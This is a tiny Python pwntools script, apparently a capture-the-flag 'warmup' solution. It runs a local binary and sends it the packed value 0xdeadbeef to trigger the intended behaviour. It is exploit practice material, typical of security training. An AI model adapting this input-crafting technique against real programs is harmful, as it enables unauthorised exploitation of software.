from pwn import *

p = process('./warmup')
p.send(p32(0xdeadbeef))
print  p.recvall()
